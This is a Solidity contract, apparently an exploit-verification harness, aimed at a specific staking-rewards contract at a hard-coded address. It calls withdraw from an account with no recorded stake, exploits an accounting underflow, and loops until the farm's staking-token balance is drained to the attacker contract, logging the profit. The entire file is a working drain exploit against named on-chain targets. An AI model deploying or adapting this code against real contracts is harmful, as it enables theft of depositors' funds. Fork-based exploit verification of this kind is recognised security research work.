// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStakingRewardsLike {
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 amount) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant EXPECTED_STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant EXPECTED_REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    string public hypothesisResult;

    address public stakingTokenObserved;
    address public rewardsTokenObserved;

    uint256 public attackerRecordedStakeBefore;
    uint256 public attackerRecordedStakeAfter;
    uint256 public farmTotalSupplyBefore;
    uint256 public farmTotalSupplyAfter;
    uint256 public farmStakingBalanceBefore;
    uint256 public farmStakingBalanceAfter;
    uint256 public attackerWalletBalanceBefore;
    uint256 public attackerWalletBalanceAfter;
    uint256 public drainedRounds;

    string public exploitPathUsed;
    string public failureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = EXPECTED_STAKING_TOKEN;
        hypothesisResult = "unexecuted";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        stakingTokenObserved = farm.stakingToken();
        rewardsTokenObserved = farm.rewardsToken();
        _profitToken = stakingTokenObserved;

        attackerRecordedStakeBefore = farm.balanceOf(address(this));
        farmTotalSupplyBefore = farm.totalSupply();
        farmStakingBalanceBefore = IERC20Like(stakingTokenObserved).balanceOf(TARGET);
        attackerWalletBalanceBefore = IERC20Like(stakingTokenObserved).balanceOf(address(this));

        exploitPathUsed = "call withdraw(amount) from an address with zero or insufficient recorded stake -> _balances[user] and _totalSupply underflow inside _withdraw(amount) -> stakingToken.transfer(recipient, amount) sends real staking tokens -> repeat until the farm staking-token balance is exhausted";

        if (stakingTokenObserved != EXPECTED_STAKING_TOKEN || rewardsTokenObserved != EXPECTED_REWARD_TOKEN) {
            failureReason = "unexpected live token addresses for the configured target";
            _snapshotAfter(farm);
            hypothesisResult = "refuted";
            return;
        }

        if (farmStakingBalanceBefore == 0) {
            // Concrete infeasibility reason for this exact exploit path: even though the accounting bug exists,
            // there is no live staking-token inventory in the farm to transfer to the attacker at this fork.
            failureReason = "farm holds zero staking tokens at the fork block";
            _snapshotAfter(farm);
            hypothesisResult = "refuted";
            return;
        }

        uint256 remaining = farmStakingBalanceBefore;
        uint256 previousRemaining = remaining;

        while (remaining != 0) {
            // Path stage 1: call withdraw(amount) from an address with zero or insufficient recorded stake.
            try farm.withdraw(remaining) {
                drainedRounds += 1;
            } catch Error(string memory reason) {
                failureReason = reason;
                break;
            } catch {
                failureReason = "withdraw reverted";
                break;
            }

            uint256 updatedRemaining = IERC20Like(stakingTokenObserved).balanceOf(TARGET);
            if (updatedRemaining >= previousRemaining) {
                failureReason = "farm staking balance did not decrease after withdraw";
                break;
            }

            previousRemaining = updatedRemaining;
            remaining = updatedRemaining;
        }

        _snapshotAfter(farm);

        if (attackerWalletBalanceAfter > attackerWalletBalanceBefore) {
            _profitAmount = attackerWalletBalanceAfter - attackerWalletBalanceBefore;
            profitAchieved = true;
        }

        hypothesisValidated =
            _profitAmount != 0 &&
            attackerRecordedStakeBefore < farmStakingBalanceBefore &&
            stakingTokenObserved == EXPECTED_STAKING_TOKEN &&
            rewardsTokenObserved == EXPECTED_REWARD_TOKEN;

        hypothesisResult = hypothesisValidated ? "validated" : "refuted";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _snapshotAfter(IStakingRewardsLike farm) internal {
        attackerRecordedStakeAfter = farm.balanceOf(address(this));
        farmTotalSupplyAfter = farm.totalSupply();
        farmStakingBalanceAfter = IERC20Like(stakingTokenObserved).balanceOf(TARGET);
        attackerWalletBalanceAfter = IERC20Like(stakingTokenObserved).balanceOf(address(this));
    }
}
